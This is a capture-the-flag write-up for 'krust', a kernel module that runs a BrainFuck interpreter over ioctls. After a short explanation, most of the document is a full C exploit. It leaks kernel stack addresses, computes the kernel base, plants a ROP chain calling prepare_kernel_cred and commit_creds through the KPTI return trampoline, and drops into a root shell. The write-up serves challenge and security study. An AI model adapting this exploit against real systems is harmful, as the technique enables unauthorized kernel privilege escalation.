# Pwn

## Krust

krust is a kernel module which implements the BrainFuck interpreter. Besides the original BrainFuck features, the kernel module exports three ioctl interfaces by character device to:

1. run BrainFuck code, which cmd is 0x4500BEEF
2. get value from result stack, which cmd is 0x8500BEEF
3. put our data into result stack, which cmd is 0x45001234

We can use feat.1 “>” multiple times to move BrainFuck offset to where register $rbp points to, and use feat.1 to run “.>” repeatedly to move addresses on the stack into the BF result stack. Then we just use feat.2 to leak kernel addresses in the BrainFuck result stack, which lives in the stack.

Once we get the kernel address, we can subtract offset to get kernel base address and build ROP chains. Then we use feat.3 to put the ROP chain into result stack, and run “<'' multiple times to move BrainFuck offset back to $rsp, and run “,>” to move data which are on the BrainFuck result stack into $rsp (krust ioctl calling stack). Those first ROP gadget will be viewed as the return address and run the ROP chain after krust ioctl handler finish its work.



```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>

#define wcmd1 0x4500BEEF // write1
#define wcmd2 0x45001234 // write2
#define rcmd1 0x8500BEEF // read our payload

size_t user_ss, user_cs, user_rflags, user_sp;
void save_status() {
    __asm__(""
            "mov user_ss, ss;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}

void get_shell()
{
    system("sh");
}

int main()
{
    int fd;
    char payload[0x500];
    unsigned long buf[0x500 / 8];
    unsigned long rop[0x500 / 8];
    unsigned long kern_base;

    save_status();
    fd = open("/dev/krust", O_RDWR);

    // shift 0x500
    for (int i = 0; i < 0x500; i++)
        payload[i] = '>';
    ioctl(fd, wcmd1, payload);

    // shift 0x3a0 and leak
    for (int i = 0; i < 0x400; i++)
        payload[i] = '>';
    for (int i = 0x400; i < 0x500; i+=2) {
        payload[i] = '.';
        payload[i+1] = '>';
    }
    ioctl(fd, wcmd1, payload);

    ioctl(fd, rcmd1, buf);
    for (int i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) {
        printf("%03x: 0x%016lx\n", i, buf[i]);
    }
    kern_base = buf[1] - 0x16b7e1;
    // ffffffff8107e660 T commit_cred
    unsigned long commit_cred = kern_base + 517728;


    int idx = 4;
    memset(rop, '+', sizeof(rop));
    // 0xffffffff81057620 : pop rdi ; ret
    rop[idx++] = kern_base + 357920;
    rop[idx++] = 0;

    // ffffffff8107e940 T prepare_kernel_cred
    rop[idx++] = kern_base + 518464;

    // 0xffffffff8101a913 : pop rcx ; ret
    rop[idx++] = kern_base + 108819;
    rop[idx++] = commit_cred;

    // 0xffffffff811fcf50 : mov rdi, rax ; pop rbp ; jmp rcx
    rop[idx++] = kern_base + 2084688;
    rop[idx++] = 0;

    // ffffffff81600df0 T swapgs_restore_regs_and_return_to_usermode
    // kpti_trampoline
    rop[idx++] = kern_base + 6295024 + 22;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = (unsigned long)get_shell;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_sp;
    rop[idx++] = user_ss;
    ioctl(fd, wcmd2, rop);




    getchar();
    for (int i = 0; i < 0xf8; i++)
        payload[i] = '<';
    for (int i = 0xf8; i < 0x500; i+=2) {
        payload[i] = ',';
        payload[i+1] = '>';
    }

    if (fork()) {
        ioctl(fd, wcmd1, payload);
    }

    return 0;
}
```

